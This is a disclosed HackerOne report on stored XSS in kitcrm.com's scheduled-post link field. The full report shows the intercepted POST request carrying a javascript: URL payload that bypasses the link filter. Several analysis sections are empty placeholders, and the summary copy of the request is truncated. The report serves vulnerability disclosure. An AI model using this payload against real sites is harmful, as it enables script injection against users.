# Stored passive XSS at scheduled posts (kitcrm.com)

## Metadata
- **Source:** HackerOne
- **Report:** 214581 | https://hackerone.com/reports/214581
- **Submitted:** 2017-03-19
- **Reporter:** skavans
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Hello!

There is improper filtration of the `website link` field of scheduled post. Attacker can intercept the scheduled post creation/modifying request and change it content the following way:

```http
POST /pages/175422/manual_posts/31163 HTTP/1.1
Host: kitcrm.com
<redacted>

-----------------------------15916813141840537191014403553
Content-Disposition: form-data; name="manual_post[link]"

java

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello!

There is improper filtration of the `website link` field of scheduled post. Attacker can intercept the scheduled post creation/modifying request and change it content the following way:

```http
POST /pages/175422/manual_posts/31163 HTTP/1.1
Host: kitcrm.com
<redacted>

-----------------------------15916813141840537191014403553
Content-Disposition: form-data; name="manual_post[link]"

javascript:alert(document.domain);//http://
-----------------------------15916813141840537191014403553
<redacted>
```

that leads to filter bypass and JS execution while victim clicks the link:

{F169880}


</details>

---
*Analysed by Claude on 2026-05-24*
